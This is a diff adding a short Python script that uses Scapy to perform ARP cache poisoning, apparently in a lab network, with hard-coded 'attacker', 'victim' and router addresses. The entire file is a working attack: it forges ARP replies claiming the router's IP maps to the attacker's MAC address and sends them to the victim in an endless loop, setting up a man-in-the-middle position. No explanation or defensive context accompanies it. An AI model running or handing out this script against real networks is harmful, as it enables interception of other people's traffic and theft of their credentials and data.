@@ -1,0 +1,21 @@
+from scapy.all import *
+import time
+
+ipRouter = "192.168.0.1"
+
+macAttacker = "08:00:27:ed:5b:9f"
+ipAttacker = "192.168.0.104"
+
+macVictim = "08:00:27:0c:5f:3b"
+ipVictim = "192.168.0.103"
+
+arp = Ether() / ARP()
+
+arp[Ether].src= macAttacker
+arp[ARP].hwsrc= macAttacker
+arp[ARP].psrc= ipRouter
+arp[ARP].hwdst = macVictim
+arp[ARP].pdst = ipVictim
+
+while True:
+	sendp(arp)
